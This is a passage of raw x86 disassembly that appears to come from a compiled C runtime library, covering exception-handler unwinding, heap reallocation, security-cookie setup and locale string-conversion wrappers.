  4257fb:	sub    esp,0x8
  4257fe:	push   ebx
  4257ff:	push   esi
  425800:	push   edi
  425801:	push   ebp
  425802:	cld    
  425803:	mov    ebx,DWORD PTR [ebp+0xc]
  425806:	mov    eax,DWORD PTR [ebp+0x8]
  425809:	test   DWORD PTR [eax+0x4],0x6
  425810:	jne    0x425898
  425816:	mov    DWORD PTR [ebp-0x8],eax
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	mov    DWORD PTR [ebp-0x4],eax
  42581f:	lea    eax,[ebp-0x8]
  425822:	mov    DWORD PTR [ebx-0x4],eax
  425825:	mov    esi,DWORD PTR [ebx+0xc]
  425828:	mov    edi,DWORD PTR [ebx+0x8]
  42582b:	cmp    esi,0xffffffff
  42582e:	je     0x425891
  425830:	lea    ecx,[esi+esi*2]
  425833:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425838:	je     0x42587f
  42583a:	push   esi
  42583b:	push   ebp
  42583c:	lea    ebp,[ebx+0x10]
  42583f:	call   DWORD PTR [edi+ecx*4+0x4]
  425843:	pop    ebp
  425844:	pop    esi
  425845:	mov    ebx,DWORD PTR [ebp+0xc]
  425848:	or     eax,eax
  42584a:	je     0x42587f
  42584c:	js     0x42588a
  42584e:	mov    edi,DWORD PTR [ebx+0x8]
  425851:	push   ebx
  425852:	call   0x426780
  425857:	add    esp,0x4
  42585a:	lea    ebp,[ebx+0x10]
  42585d:	push   esi
  42585e:	push   ebx
  42585f:	call   0x4267c2
  425864:	add    esp,0x8
  425867:	lea    ecx,[esi+esi*2]
  42586a:	push   0x1
  42586c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  425870:	call   0x426856
  425875:	mov    eax,DWORD PTR [edi+ecx*4]
  425878:	mov    DWORD PTR [ebx+0xc],eax
  42587b:	call   DWORD PTR [edi+ecx*4+0x8]
  42587f:	mov    edi,DWORD PTR [ebx+0x8]
  425882:	lea    ecx,[esi+esi*2]
  425885:	mov    esi,DWORD PTR [edi+ecx*4]
  425888:	jmp    0x42582b
  42588a:	mov    eax,0x0
  42588f:	jmp    0x4258ad
  425891:	mov    eax,0x1
  425896:	jmp    0x4258ad
  425898:	push   ebp
  425899:	lea    ebp,[ebx+0x10]
  42589c:	push   0xffffffff
  42589e:	push   ebx
  42589f:	call   0x4267c2
  4258a4:	add    esp,0x8
  4258a7:	pop    ebp
  4258a8:	mov    eax,0x1
  4258ad:	pop    ebp
  4258ae:	pop    edi
  4258af:	pop    esi
  4258b0:	pop    ebx
  4258b1:	mov    esp,ebp
  4258b3:	pop    ebp
  4258b4:	ret    
  4258b5:	push   ebp
  4258b6:	mov    ecx,DWORD PTR [esp+0x8]
  4258ba:	mov    ebp,DWORD PTR [ecx]
  4258bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4258bf:	push   eax
  4258c0:	mov    eax,DWORD PTR [ecx+0x18]
  4258c3:	push   eax
  4258c4:	call   0x4267c2
  4258c9:	add    esp,0x8
  4258cc:	pop    ebp
  4258cd:	ret    0x4
  4258d0:	call   0x4237e9
  4258d5:	add    eax,0x8
  4258d8:	ret    
  4258d9:	push   0x14
  4258db:	push   0x4287b8
  4258e0:	call   0x423934
  4258e5:	mov    edi,DWORD PTR [ebp+0x8]
  4258e8:	xor    ebx,ebx
  4258ea:	cmp    edi,ebx
  4258ec:	jne    0x4258fc
  4258ee:	push   DWORD PTR [ebp+0xc]
  4258f1:	call   0x424652
  4258f6:	pop    ecx
  4258f7:	jmp    0x425a80
  4258fc:	mov    esi,DWORD PTR [ebp+0xc]
  4258ff:	cmp    esi,ebx
  425901:	jne    0x42590f
  425903:	push   edi
  425904:	call   0x42453a
  425909:	pop    ecx
  42590a:	jmp    0x425a7e
  42590f:	cmp    DWORD PTR ds:0x463324,0x3
  425916:	jne    0x425a4a
  42591c:	mov    DWORD PTR [ebp-0x1c],ebx
  42591f:	cmp    esi,0xffffffe0
  425922:	ja     0x425a19
  425928:	push   0x4
  42592a:	call   0x423aef
  42592f:	pop    ecx
  425930:	mov    DWORD PTR [ebp-0x4],ebx
  425933:	push   edi
  425934:	call   0x424d12
  425939:	pop    ecx
  42593a:	mov    DWORD PTR [ebp-0x20],eax
  42593d:	cmp    eax,ebx
  42593f:	je     0x4259e9
  425945:	cmp    esi,DWORD PTR ds:0x4630e4
  42594b:	ja     0x425999
  42594d:	push   esi
  42594e:	push   edi
  42594f:	push   eax
  425950:	call   0x425212
  425955:	add    esp,0xc
  425958:	test   eax,eax
  42595a:	je     0x425961
  42595c:	mov    DWORD PTR [ebp-0x1c],edi
  42595f:	jmp    0x425999
  425961:	push   esi
  425962:	call   0x4254f1
  425967:	pop    ecx
  425968:	mov    DWORD PTR [ebp-0x1c],eax
  42596b:	cmp    eax,ebx
  42596d:	je     0x425999
  42596f:	mov    eax,DWORD PTR [edi-0x4]
  425972:	dec    eax
  425973:	mov    DWORD PTR [ebp-0x24],eax
  425976:	cmp    eax,esi
  425978:	jb     0x42597c
  42597a:	mov    eax,esi
  42597c:	push   eax
  42597d:	push   edi
  42597e:	push   DWORD PTR [ebp-0x1c]
  425981:	call   0x424670
  425986:	push   edi
  425987:	call   0x424d12
  42598c:	mov    DWORD PTR [ebp-0x20],eax
  42598f:	push   edi
  425990:	push   eax
  425991:	call   0x424d3d
  425996:	add    esp,0x18
  425999:	cmp    DWORD PTR [ebp-0x1c],ebx
  42599c:	jne    0x4259e9
  42599e:	cmp    esi,ebx
  4259a0:	jne    0x4259a8
  4259a2:	xor    esi,esi
  4259a4:	inc    esi
  4259a5:	mov    DWORD PTR [ebp+0xc],esi
  4259a8:	add    esi,0xf
  4259ab:	and    esi,0xfffffff0
  4259ae:	mov    DWORD PTR [ebp+0xc],esi
  4259b1:	push   esi
  4259b2:	push   ebx
  4259b3:	push   DWORD PTR ds:0x463320
  4259b9:	call   DWORD PTR ds:0x4280e0
  4259bf:	mov    DWORD PTR [ebp-0x1c],eax
  4259c2:	cmp    eax,ebx
  4259c4:	je     0x4259e9
  4259c6:	mov    eax,DWORD PTR [edi-0x4]
  4259c9:	dec    eax
  4259ca:	mov    DWORD PTR [ebp-0x24],eax
  4259cd:	cmp    eax,esi
  4259cf:	jb     0x4259d3
  4259d1:	mov    eax,esi
  4259d3:	push   eax
  4259d4:	push   edi
  4259d5:	push   DWORD PTR [ebp-0x1c]
  4259d8:	call   0x424670
  4259dd:	push   edi
  4259de:	push   DWORD PTR [ebp-0x20]
  4259e1:	call   0x424d3d
  4259e6:	add    esp,0x14
  4259e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4259ed:	call   0x425a41
  4259f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4259f5:	jne    0x425a19
  4259f7:	cmp    esi,ebx
  4259f9:	jne    0x4259fe
  4259fb:	xor    esi,esi
  4259fd:	inc    esi
  4259fe:	add    esi,0xf
  425a01:	and    esi,0xfffffff0
  425a04:	mov    DWORD PTR [ebp+0xc],esi
  425a07:	push   esi
  425a08:	push   edi
  425a09:	push   ebx
  425a0a:	push   DWORD PTR ds:0x463320
  425a10:	call   DWORD PTR ds:0x4280ec
  425a16:	mov    DWORD PTR [ebp-0x1c],eax
  425a19:	mov    eax,DWORD PTR [ebp-0x1c]
  425a1c:	cmp    eax,ebx
  425a1e:	jne    0x425a80
  425a20:	cmp    DWORD PTR ds:0x462fa8,ebx
  425a26:	je     0x425a80
  425a28:	push   esi
  425a29:	call   0x426212
  425a2e:	pop    ecx
  425a2f:	test   eax,eax
  425a31:	jne    0x42591c
  425a37:	jmp    0x425a7e
  425a39:	xor    ebx,ebx
  425a3b:	mov    esi,DWORD PTR [ebp+0xc]
  425a3e:	mov    edi,DWORD PTR [ebp+0x8]
  425a41:	push   0x4
  425a43:	call   0x423a5b
  425a48:	pop    ecx
  425a49:	ret    
  425a4a:	xor    eax,eax
  425a4c:	cmp    esi,0xffffffe0
  425a4f:	ja     0x425a67
  425a51:	cmp    esi,ebx
  425a53:	jne    0x425a58
  425a55:	xor    esi,esi
  425a57:	inc    esi
  425a58:	push   esi
  425a59:	push   edi
  425a5a:	push   ebx
  425a5b:	push   DWORD PTR ds:0x463320
  425a61:	call   DWORD PTR ds:0x4280ec
  425a67:	cmp    eax,ebx
  425a69:	jne    0x425a80
  425a6b:	cmp    DWORD PTR ds:0x462fa8,ebx
  425a71:	je     0x425a80
  425a73:	push   esi
  425a74:	call   0x426212
  425a79:	pop    ecx
  425a7a:	test   eax,eax
  425a7c:	jne    0x425a4a
  425a7e:	xor    eax,eax
  425a80:	call   0x42396f
  425a85:	ret    
  425a86:	push   0x10
  425a88:	push   0x4287c8
  425a8d:	call   0x423934
  425a92:	cmp    DWORD PTR ds:0x463324,0x3
  425a99:	jne    0x425ad5
  425a9b:	push   0x4
  425a9d:	call   0x423aef
  425aa2:	pop    ecx
  425aa3:	and    DWORD PTR [ebp-0x4],0x0
  425aa7:	mov    esi,DWORD PTR [ebp+0x8]
  425aaa:	push   esi
  425aab:	call   0x424d12
  425ab0:	pop    ecx
  425ab1:	mov    DWORD PTR [ebp-0x1c],eax
  425ab4:	test   eax,eax
  425ab6:	je     0x425ac3
  425ab8:	mov    esi,DWORD PTR [esi-0x4]
  425abb:	sub    esi,0x9
  425abe:	mov    DWORD PTR [ebp-0x20],esi
  425ac1:	jmp    0x425ac6
  425ac3:	mov    esi,DWORD PTR [ebp-0x20]
  425ac6:	or     DWORD PTR [ebp-0x4],0xffffffff
  425aca:	call   0x425af3
  425acf:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ad3:	jne    0x425ae8
  425ad5:	push   DWORD PTR [ebp+0x8]
  425ad8:	push   0x0
  425ada:	push   DWORD PTR ds:0x463320
  425ae0:	call   DWORD PTR ds:0x4280f0
  425ae6:	mov    esi,eax
  425ae8:	mov    eax,esi
  425aea:	call   0x42396f
  425aef:	ret    
  425af0:	mov    esi,DWORD PTR [ebp-0x20]
  425af3:	push   0x4
  425af5:	call   0x423a5b
  425afa:	pop    ecx
  425afb:	ret    
  425afc:	push   ebp
  425afd:	mov    ebp,esp
  425aff:	sub    esp,0x10
  425b02:	push   esi
  425b03:	lea    eax,[ebp-0x8]
  425b06:	push   eax
  425b07:	call   DWORD PTR ds:0x428100
  425b0d:	mov    esi,DWORD PTR [ebp-0x4]
  425b10:	xor    esi,DWORD PTR [ebp-0x8]
  425b13:	call   DWORD PTR ds:0x4280fc
  425b19:	xor    esi,eax
  425b1b:	call   DWORD PTR ds:0x42802c
  425b21:	xor    esi,eax
  425b23:	call   DWORD PTR ds:0x4280f8
  425b29:	xor    esi,eax
  425b2b:	lea    eax,[ebp-0x10]
  425b2e:	push   eax
  425b2f:	call   DWORD PTR ds:0x4280f4
  425b35:	mov    eax,DWORD PTR [ebp-0xc]
  425b38:	xor    eax,DWORD PTR [ebp-0x10]
  425b3b:	xor    esi,eax
  425b3d:	mov    DWORD PTR ds:0x462600,esi
  425b43:	jne    0x425b4f
  425b45:	mov    DWORD PTR ds:0x462600,0xbb40e64e
  425b4f:	pop    esi
  425b50:	leave  
  425b51:	ret    
  425b52:	push   0x118
  425b57:	push   0x428978
  425b5c:	call   0x423934
  425b61:	mov    eax,ds:0x462600
  425b66:	xor    eax,DWORD PTR [ebp+0x4]
  425b69:	mov    DWORD PTR [ebp-0x1c],eax
  425b6c:	mov    eax,ds:0x462f78
  425b71:	xor    ecx,ecx
  425b73:	cmp    eax,ecx
  425b75:	je     0x425b96
  425b77:	mov    DWORD PTR [ebp-0x4],ecx
  425b7a:	push   DWORD PTR [ebp+0xc]
  425b7d:	push   DWORD PTR [ebp+0x8]
  425b80:	call   eax
  425b82:	pop    ecx
  425b83:	pop    ecx
  425b84:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b88:	jmp    0x425c94
  425b8d:	xor    eax,eax
  425b8f:	inc    eax
  425b90:	ret    
  425b91:	mov    esp,DWORD PTR [ebp-0x18]
  425b94:	jmp    0x425b84
  425b96:	mov    eax,DWORD PTR [ebp+0x8]
  425b99:	dec    eax
  425b9a:	je     0x425baf
  425b9c:	mov    edi,0x428954
  425ba1:	mov    DWORD PTR [ebp-0x20],0x4288a0
  425ba8:	mov    esi,0xd4
  425bad:	jmp    0x425bc0
  425baf:	mov    edi,0x428880
  425bb4:	mov    DWORD PTR [ebp-0x20],0x4287e0
  425bbb:	mov    esi,0xb9
  425bc0:	mov    BYTE PTR [ebp-0x24],cl
  425bc3:	push   0x104
  425bc8:	lea    eax,[ebp-0x128]
  425bce:	push   eax
  425bcf:	push   ecx
  425bd0:	call   DWORD PTR ds:0x428084
  425bd6:	test   eax,eax
  425bd8:	jne    0x425bed
  425bda:	push   0x4284d4
  425bdf:	lea    eax,[ebp-0x128]
  425be5:	push   eax
  425be6:	call   0x423d10
  425beb:	pop    ecx
  425bec:	pop    ecx
  425bed:	lea    ebx,[ebp-0x128]
  425bf3:	lea    eax,[ebp-0x128]
  425bf9:	push   eax
  425bfa:	call   0x423f40
  425bff:	pop    ecx
  425c00:	add    eax,0xb
  425c03:	cmp    eax,0x3c
  425c06:	jbe    0x425c31
  425c08:	lea    eax,[ebp-0x128]
  425c0e:	push   eax
  425c0f:	call   0x423f40
  425c14:	mov    ebx,eax
  425c16:	lea    eax,[ebp-0x128]
  425c1c:	sub    eax,0x31
  425c1f:	add    ebx,eax
  425c21:	push   0x3
  425c23:	push   0x4284d0
  425c28:	push   ebx
  425c29:	call   0x423e10
  425c2e:	add    esp,0x10
  425c31:	push   ebx
  425c32:	call   0x423f40
  425c37:	pop    ecx
  425c38:	lea    eax,[eax+esi*1+0xc]
  425c3c:	add    eax,0x3
  425c3f:	and    eax,0xfffffffc
  425c42:	call   0x423980
  425c47:	mov    DWORD PTR [ebp-0x18],esp
  425c4a:	mov    esi,esp
  425c4c:	push   edi
  425c4d:	push   esi
  425c4e:	call   0x423d10
  425c53:	mov    edi,0x4284b0
  425c58:	push   edi
  425c59:	push   esi
  425c5a:	call   0x423d20
  425c5f:	push   0x4287d4
  425c64:	push   esi
  425c65:	call   0x423d20
  425c6a:	push   ebx
  425c6b:	push   esi
  425c6c:	call   0x423d20
  425c71:	push   edi
  425c72:	push   esi
  425c73:	call   0x423d20
  425c78:	push   DWORD PTR [ebp-0x20]
  425c7b:	push   esi
  425c7c:	call   0x423d20
  425c81:	push   0x12010
  425c86:	push   0x428488
  425c8b:	push   esi
  425c8c:	call   0x423c12
  425c91:	add    esp,0x3c
  425c94:	push   0x3
  425c96:	call   0x422da2
  425c9b:	int3   
  425c9c:	push   0x38
  425c9e:	push   0x428d98
  425ca3:	call   0x423934
  425ca8:	xor    ebx,ebx
  425caa:	cmp    DWORD PTR ds:0x462f9c,ebx
  425cb0:	jne    0x425cea
  425cb2:	push   ebx
  425cb3:	push   ebx
  425cb4:	xor    esi,esi
  425cb6:	inc    esi
  425cb7:	push   esi
  425cb8:	push   0x428d94
  425cbd:	push   0x100
  425cc2:	push   ebx
  425cc3:	call   DWORD PTR ds:0x42810c
  425cc9:	test   eax,eax
  425ccb:	je     0x425cd5
  425ccd:	mov    DWORD PTR ds:0x462f9c,esi
  425cd3:	jmp    0x425cea
  425cd5:	call   DWORD PTR ds:0x42801c
  425cdb:	cmp    eax,0x78
  425cde:	jne    0x425cea
  425ce0:	mov    DWORD PTR ds:0x462f9c,0x2
  425cea:	cmp    DWORD PTR [ebp+0x14],ebx
  425ced:	jle    0x425d0a
  425cef:	mov    ecx,DWORD PTR [ebp+0x14]
  425cf2:	mov    eax,DWORD PTR [ebp+0x10]
  425cf5:	dec    ecx
  425cf6:	cmp    BYTE PTR [eax],bl
  425cf8:	je     0x425d02
  425cfa:	inc    eax
  425cfb:	cmp    ecx,ebx
  425cfd:	jne    0x425cf5
  425cff:	or     ecx,0xffffffff
  425d02:	or     eax,0xffffffff
  425d05:	sub    eax,ecx
  425d07:	add    DWORD PTR [ebp+0x14],eax
  425d0a:	mov    eax,ds:0x462f9c
  425d0f:	cmp    eax,0x2
  425d12:	je     0x425ef4
  425d18:	cmp    eax,ebx
  425d1a:	je     0x425ef4
  425d20:	cmp    eax,0x1
  425d23:	jne    0x425f27
  425d29:	xor    edi,edi
  425d2b:	mov    DWORD PTR [ebp-0x1c],edi
  425d2e:	mov    DWORD PTR [ebp-0x20],ebx
  425d31:	mov    DWORD PTR [ebp-0x24],ebx
  425d34:	cmp    DWORD PTR [ebp+0x20],ebx
  425d37:	jne    0x425d41
  425d39:	mov    eax,ds:0x462f94
  425d3e:	mov    DWORD PTR [ebp+0x20],eax
  425d41:	push   ebx
  425d42:	push   ebx
  425d43:	push   DWORD PTR [ebp+0x14]
  425d46:	push   DWORD PTR [ebp+0x10]
  425d49:	xor    eax,eax
  425d4b:	cmp    DWORD PTR [ebp+0x24],ebx
  425d4e:	setne  al
  425d51:	lea    eax,[eax*8+0x1]
  425d58:	push   eax
  425d59:	push   DWORD PTR [ebp+0x20]
  425d5c:	call   DWORD PTR ds:0x428108
  425d62:	mov    esi,eax
  425d64:	mov    DWORD PTR [ebp-0x28],esi
  425d67:	cmp    esi,ebx
  425d69:	je     0x425f27
  425d6f:	mov    DWORD PTR [ebp-0x4],0x1
  425d76:	lea    eax,[esi+esi*1]
  425d79:	add    eax,0x3
  425d7c:	and    eax,0xfffffffc
  425d7f:	call   0x423980
  425d84:	mov    DWORD PTR [ebp-0x18],esp
  425d87:	mov    eax,esp
  425d89:	mov    DWORD PTR [ebp-0x2c],eax
  425d8c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d90:	jmp    0x425dad
  425d92:	xor    eax,eax
  425d94:	inc    eax
  425d95:	ret    
  425d96:	mov    esp,DWORD PTR [ebp-0x18]
  425d99:	call   0x426dc5
  425d9e:	xor    ebx,ebx
  425da0:	mov    DWORD PTR [ebp-0x2c],ebx
  425da3:	or     DWORD PTR [ebp-0x4],0xffffffff
  425da7:	mov    edi,DWORD PTR [ebp-0x1c]
  425daa:	mov    esi,DWORD PTR [ebp-0x28]
  425dad:	cmp    DWORD PTR [ebp-0x2c],ebx
  425db0:	jne    0x425dce
  425db2:	lea    eax,[esi+esi*1]
  425db5:	push   eax
  425db6:	call   0x424652
  425dbb:	pop    ecx
  425dbc:	mov    DWORD PTR [ebp-0x2c],eax
  425dbf:	cmp    eax,ebx
  425dc1:	je     0x425f27
  425dc7:	mov    DWORD PTR [ebp-0x20],0x1
  425dce:	push   esi
  425dcf:	push   DWORD PTR [ebp-0x2c]
  425dd2:	push   DWORD PTR [ebp+0x14]
  425dd5:	push   DWORD PTR [ebp+0x10]
  425dd8:	push   0x1
  425dda:	push   DWORD PTR [ebp+0x20]
  425ddd:	call   DWORD PTR ds:0x428108
  425de3:	test   eax,eax
  425de5:	je     0x425ed1
  425deb:	push   ebx
  425dec:	push   ebx
  425ded:	push   esi
  425dee:	push   DWORD PTR [ebp-0x2c]
  425df1:	push   DWORD PTR [ebp+0xc]
  425df4:	push   DWORD PTR [ebp+0x8]
  425df7:	call   DWORD PTR ds:0x42810c
  425dfd:	mov    edi,eax
  425dff:	mov    DWORD PTR [ebp-0x1c],edi
  425e02:	cmp    edi,ebx
  425e04:	je     0x425ed1
  425e0a:	test   BYTE PTR [ebp+0xd],0x4
  425e0e:	je     0x425e3d
  425e10:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e13:	je     0x425ed1
  425e19:	cmp    edi,DWORD PTR [ebp+0x1c]
  425e1c:	jg     0x425ed1
  425e22:	push   DWORD PTR [ebp+0x1c]
  425e25:	push   DWORD PTR [ebp+0x18]
  425e28:	push   esi
  425e29:	push   DWORD PTR [ebp-0x2c]
  425e2c:	push   DWORD PTR [ebp+0xc]
  425e2f:	push   DWORD PTR [ebp+0x8]
  425e32:	call   DWORD PTR ds:0x42810c
  425e38:	jmp    0x425ed1
  425e3d:	mov    DWORD PTR [ebp-0x4],0x2
  425e44:	lea    eax,[edi+edi*1]
  425e47:	add    eax,0x3
  425e4a:	and    eax,0xfffffffc
  425e4d:	call   0x423980
  425e52:	mov    DWORD PTR [ebp-0x18],esp
  425e55:	mov    eax,esp
  425e57:	mov    DWORD PTR [ebp-0x30],eax
  425e5a:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e5e:	jmp    0x425e7b
  425e60:	xor    eax,eax
  425e62:	inc    eax
  425e63:	ret    
  425e64:	mov    esp,DWORD PTR [ebp-0x18]
  425e67:	call   0x426dc5
  425e6c:	xor    ebx,ebx
  425e6e:	mov    DWORD PTR [ebp-0x30],ebx
  425e71:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e75:	mov    edi,DWORD PTR [ebp-0x1c]
  425e78:	mov    esi,DWORD PTR [ebp-0x28]
  425e7b:	cmp    DWORD PTR [ebp-0x30],ebx
  425e7e:	jne    0x425e98
  425e80:	lea    eax,[edi+edi*1]
  425e83:	push   eax
  425e84:	call   0x424652
  425e89:	pop    ecx
  425e8a:	mov    DWORD PTR [ebp-0x30],eax
  425e8d:	cmp    eax,ebx
  425e8f:	je     0x425ed1
  425e91:	mov    DWORD PTR [ebp-0x24],0x1
  425e98:	push   edi
  425e99:	push   DWORD PTR [ebp-0x30]
  425e9c:	push   esi
  425e9d:	push   DWORD PTR [ebp-0x2c]
  425ea0:	push   DWORD PTR [ebp+0xc]
  425ea3:	push   DWORD PTR [ebp+0x8]
  425ea6:	call   DWORD PTR ds:0x42810c
  425eac:	test   eax,eax
  425eae:	je     0x425ed1
  425eb0:	push   ebx
  425eb1:	push   ebx
  425eb2:	cmp    DWORD PTR [ebp+0x1c],ebx
  425eb5:	jne    0x425ebb
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	jmp    0x425ec1
  425ebb:	push   DWORD PTR [ebp+0x1c]
  425ebe:	push   DWORD PTR [ebp+0x18]
  425ec1:	push   edi
  425ec2:	push   DWORD PTR [ebp-0x30]
  425ec5:	push   ebx
  425ec6:	push   DWORD PTR [ebp+0x20]
  425ec9:	call   DWORD PTR ds:0x428094
  425ecf:	mov    edi,eax
  425ed1:	cmp    DWORD PTR [ebp-0x24],ebx
  425ed4:	je     0x425edf
  425ed6:	push   DWORD PTR [ebp-0x30]
  425ed9:	call   0x42453a
  425ede:	pop    ecx
  425edf:	cmp    DWORD PTR [ebp-0x20],ebx
  425ee2:	je     0x425eed
  425ee4:	push   DWORD PTR [ebp-0x2c]
  425ee7:	call   0x42453a
  425eec:	pop    ecx
  425eed:	mov    eax,edi
  425eef:	jmp    0x42604f
  425ef4:	mov    DWORD PTR [ebp-0x34],ebx
  425ef7:	xor    edi,edi
  425ef9:	mov    DWORD PTR [ebp-0x38],ebx
  425efc:	cmp    DWORD PTR [ebp+0x8],ebx
  425eff:	jne    0x425f09
  425f01:	mov    eax,ds:0x462f84
  425f06:	mov    DWORD PTR [ebp+0x8],eax
  425f09:	cmp    DWORD PTR [ebp+0x20],ebx
  425f0c:	jne    0x425f16
  425f0e:	mov    eax,ds:0x462f94
  425f13:	mov    DWORD PTR [ebp+0x20],eax
  425f16:	push   DWORD PTR [ebp+0x8]
  425f19:	call   0x426bad
  425f1e:	pop    ecx
  425f1f:	mov    DWORD PTR [ebp-0x3c],eax
  425f22:	cmp    eax,0xffffffff
  425f25:	jne    0x425f2e
  425f27:	xor    eax,eax
  425f29:	jmp    0x42604f
  425f2e:	cmp    eax,DWORD PTR [ebp+0x20]
  425f31:	je     0x426025
  425f37:	push   ebx
  425f38:	push   ebx
  425f39:	lea    ecx,[ebp+0x14]
  425f3c:	push   ecx
  425f3d:	push   DWORD PTR [ebp+0x10]
  425f40:	push   eax
  425f41:	push   DWORD PTR [ebp+0x20]
  425f44:	call   0x426bf6
  425f49:	add    esp,0x18
  425f4c:	mov    DWORD PTR [ebp-0x34],eax
  425f4f:	cmp    eax,ebx
  425f51:	je     0x425f27
  425f53:	push   ebx
  425f54:	push   ebx
  425f55:	push   DWORD PTR [ebp+0x14]
  425f58:	push   eax
  425f59:	push   DWORD PTR [ebp+0xc]
  425f5c:	push   DWORD PTR [ebp+0x8]
  425f5f:	call   DWORD PTR ds:0x428104
  425f65:	mov    esi,eax
  425f67:	mov    DWORD PTR [ebp-0x40],esi
  425f6a:	cmp    esi,ebx
  425f6c:	je     0x426014
  425f72:	mov    DWORD PTR [ebp-0x4],ebx
  425f75:	add    eax,0x3
  425f78:	and    eax,0xfffffffc
  425f7b:	call   0x423980
  425f80:	mov    DWORD PTR [ebp-0x18],esp
  425f83:	mov    edi,esp
  425f85:	mov    DWORD PTR [ebp-0x44],edi
  425f88:	push   esi
  425f89:	push   ebx
  425f8a:	push   edi
  425f8b:	call   0x426230
  425f90:	add    esp,0xc
  425f93:	jmp    0x425fa5
  425f95:	xor    eax,eax
  425f97:	inc    eax
  425f98:	ret    
  425f99:	mov    esp,DWORD PTR [ebp-0x18]
  425f9c:	call   0x426dc5
  425fa1:	xor    ebx,ebx
  425fa3:	xor    edi,edi
  425fa5:	or     DWORD PTR [ebp-0x4],0xffffffff
  425fa9:	cmp    edi,ebx
  425fab:	jne    0x425fd0
  425fad:	push   DWORD PTR [ebp-0x40]
  425fb0:	call   0x424652
  425fb5:	pop    ecx
  425fb6:	mov    edi,eax
  425fb8:	cmp    edi,ebx
  425fba:	je     0x425fed
  425fbc:	push   DWORD PTR [ebp-0x40]
  425fbf:	push   ebx
  425fc0:	push   edi
  425fc1:	call   0x426230
  425fc6:	add    esp,0xc
  425fc9:	mov    DWORD PTR [ebp-0x38],0x1
  425fd0:	push   DWORD PTR [ebp-0x40]
  425fd3:	push   edi
  425fd4:	push   DWORD PTR [ebp+0x14]
  425fd7:	push   DWORD PTR [ebp-0x34]
  425fda:	push   DWORD PTR [ebp+0xc]
  425fdd:	push   DWORD PTR [ebp+0x8]
  425fe0:	call   DWORD PTR ds:0x428104
  425fe6:	mov    DWORD PTR [ebp-0x40],eax
  425fe9:	cmp    eax,ebx
  425feb:	jne    0x425ff1
  425fed:	xor    esi,esi
  425fef:	jmp    0x426017
  425ff1:	push   DWORD PTR [ebp+0x1c]
  425ff4:	push   DWORD PTR [ebp+0x18]
  425ff7:	lea    eax,[ebp-0x40]
  425ffa:	push   eax
  425ffb:	push   edi
  425ffc:	push   DWORD PTR [ebp+0x20]
  425fff:	push   DWORD PTR [ebp-0x3c]
  426002:	call   0x426bf6
  426007:	add    esp,0x18
  42600a:	mov    esi,eax
  42600c:	neg    esi
  42600e:	sbb    esi,esi
  426010:	neg    esi
  426012:	jmp    0x426017
  426014:	mov    esi,DWORD PTR [ebp-0x48]
  426017:	cmp    DWORD PTR [ebp-0x38],ebx
  42601a:	je     0x42603f
  42601c:	push   edi
  42601d:	call   0x42453a
  426022:	pop    ecx
  426023:	jmp    0x42603f
  426025:	push   DWORD PTR [ebp+0x1c]
  426028:	push   DWORD PTR [ebp+0x18]
  42602b:	push   DWORD PTR [ebp+0x14]
  42602e:	push   DWORD PTR [ebp+0x10]
  426031:	push   DWORD PTR [ebp+0xc]
  426034:	push   DWORD PTR [ebp+0x8]
  426037:	call   DWORD PTR ds:0x428104
  42603d:	mov    esi,eax
  42603f:	cmp    DWORD PTR [ebp-0x34],ebx
  426042:	je     0x42604d
  426044:	push   DWORD PTR [ebp-0x34]
  426047:	call   0x42453a
  42604c:	pop    ecx
  42604d:	mov    eax,esi
  42604f:	lea    esp,[ebp-0x54]
  426052:	call   0x42396f
  426057:	ret    
  426058:	push   0x1c
  42605a:	push   0x428dc0
  42605f:	call   0x423934
  426064:	xor    esi,esi
  426066:	cmp    DWORD PTR ds:0x462fa0,esi
  42606c:	jne    0x4260a3
  42606e:	lea    eax,[ebp-0x1c]
  426071:	push   eax
  426072:	xor    edi,edi
  426074:	inc    edi
  426075:	push   edi
  426076:	push   0x428d94
  42607b:	push   edi
  42607c:	call   DWORD PTR ds:0x428114
  426082:	test   eax,eax
  426084:	je     0x42608e
  426086:	mov    DWORD PTR ds:0x462fa0,edi
  42608c:	jmp    0x4260a3
  42608e:	call   DWORD PTR ds:0x42801c
  426094:	cmp    eax,0x78
  426097:	jne    0x4260a3
  426099:	mov    DWORD PTR ds:0x462fa0,0x2
  4260a3:	mov    eax,ds:0x462fa0
  4260a8:	cmp    eax,0x2
  4260ab:	je     0x42619b
  4260b1:	cmp    eax,esi
  4260b3:	je     0x42619b
  4260b9:	cmp    eax,0x1
  4260bc:	jne    0x4261c1
  4260c2:	mov    DWORD PTR [ebp-0x20],esi
  4260c5:	mov    DWORD PTR [ebp-0x24],esi
  4260c8:	cmp    DWORD PTR [ebp+0x18],esi
  4260cb:	jne    0x4260d5
  4260cd:	mov    eax,ds:0x462f94
  4260d2:	mov    DWORD PTR [ebp+0x18],eax
  4260d5:	push   esi
  4260d6:	push   esi
  4260d7:	push   DWORD PTR [ebp+0x10]
  4260da:	push   DWORD PTR [ebp+0xc]
  4260dd:	xor    eax,eax
  4260df:	cmp    DWORD PTR [ebp+0x20],esi
  4260e2:	setne  al
  4260e5:	lea    eax,[eax*8+0x1]
  4260ec:	push   eax
  4260ed:	push   DWORD PTR [ebp+0x18]
  4260f0:	call   DWORD PTR ds:0x428108
  4260f6:	mov    edi,eax
  4260f8:	mov    DWORD PTR [ebp-0x28],edi
  4260fb:	test   edi,edi
  4260fd:	je     0x4261c1
  426103:	and    DWORD PTR [ebp-0x4],0x0
  426107:	lea    ebx,[edi+edi*1]
  42610a:	mov    eax,ebx
  42610c:	add    eax,0x3
  42610f:	and    eax,0xfffffffc
  426112:	call   0x423980
  426117:	mov    DWORD PTR [ebp-0x18],esp
  42611a:	mov    esi,esp
  42611c:	mov    DWORD PTR [ebp-0x2c],esi
  42611f:	push   ebx
  426120:	push   0x0
  426122:	push   esi
  426123:	call   0x426230
  426128:	add    esp,0xc
  42612b:	or     DWORD PTR [ebp-0x4],0xffffffff
